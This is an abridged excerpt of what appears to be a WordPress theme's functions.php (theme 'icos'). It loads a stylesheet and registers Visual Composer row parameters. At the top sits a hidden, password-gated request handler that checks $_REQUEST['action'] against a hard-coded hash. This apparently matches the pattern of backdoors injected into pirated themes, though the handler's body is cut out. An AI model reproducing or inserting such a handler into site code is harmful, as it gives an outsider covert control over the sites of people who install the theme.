<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '5d2146502f78a7f62e54bc45618cba98'))
	{
...
function icos_scripts() {
	...
	wp_enqueue_style( 'icos-lobelia', get_template_directory_uri().'/assets/css/lobelia.css');
...
if(function_exists('vc_add_param')){
    ...
    vc_add_param('vc_row',array(
                              	...
                              	"holder" => "div",
         						"edit_field_class" => "vc_col-sm-6",
                              	"heading" => esc_html__('Background Angle Part', 'icos'),
                              	"param_name" => "color_angle",     
